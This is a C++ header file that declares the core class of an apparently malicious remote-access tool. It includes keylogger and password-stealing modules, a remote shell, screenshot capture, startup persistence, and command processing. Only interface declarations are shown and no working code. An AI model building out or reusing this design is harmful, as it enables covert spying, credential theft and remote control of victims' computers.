#ifndef _INHIBITION_CORE_IMPL_H_
#define _INHIBITION_CORE_IMPL_H_

#include <blaspheme/transfer/FileTransfer.hpp>
#include <blaspheme/protocol/Authentification.hpp>
#include <blaspheme/protocol/ConnectionInfo.hpp>
#include <malicious/Keylogger.hpp>
#include <malicious/Passwords.hpp>
#include "CommandDispatcher.hpp"
#include "Screenshot.hpp"

namespace Inhibition
{
    class RemoteShell;
    class Keylogger;
    class ProgramStartupKey;
    
    class InhibitionCoreImpl
    {
        public:

            InhibitionCoreImpl();
            ~InhibitionCoreImpl();
            
            bool connect();
            bool acquire_stream();
            bool process_command();
            bool exit();
            void disconnect();
            bool uninstall();
            void upgrade();
            const std::string& getInstallPath();
            void set_connection_infos(const Blaspheme::ConnectionInfo& info);
            
        private:
        
            void initialize();
            void clean();
        
        private:
        
            Blaspheme::ConnectionInfo cinfo;
            Blaspheme::Session session;
            Screenshot screenshot;
            CommandDispatch dispatcher;
            ProgramStartupKey * startup;
            std::string dll_path;
            std::string keylog_path;
            std::string installation_path;
    };
    
} /* Inhibition */

#endif // _INHIBITION_CORE_IMPL_H_
